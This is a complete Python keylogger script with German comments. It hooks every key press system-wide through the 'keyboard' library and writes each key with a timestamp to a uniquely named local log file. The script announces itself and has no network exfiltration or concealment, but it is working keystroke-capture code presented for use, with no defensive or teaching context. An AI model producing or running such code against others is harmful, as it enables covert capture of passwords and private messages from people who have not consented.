import keyboard
import datetime
import uuid

# Erstelle eine eindeutige Log-Datei
log_file = open(f"keylog_{uuid.uuid4()}.txt", "a")

def on_key(event):
    """
    Diese Funktion wird aufgerufen, wenn eine Taste gedrückt wird.
    Sie protokolliert die gedrückte Taste und den Zeitstempel in der Log-Datei.
    """
    key = event.name
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_file.write(f"{timestamp}: {key}\n")
    log_file.flush()

try:
    # Registriere die on_key-Funktion für Tastendrücke
    keyboard.on_press(on_key)

    print("Keylogger gestartet. Drücke Strg+C, um zu beenden.")

    # Warte auf Tastendrücke (blockierend)
    keyboard.wait()

except KeyboardInterrupt:
    # Beende das Programm, wenn Strg+C gedrückt wird
    print("\nKeylogger wird beendet...")

finally:
    # Schließe die Log-Datei, wenn das Programm beendet wird
    log_file.close()
    print("Log-Datei wurde geschlossen.")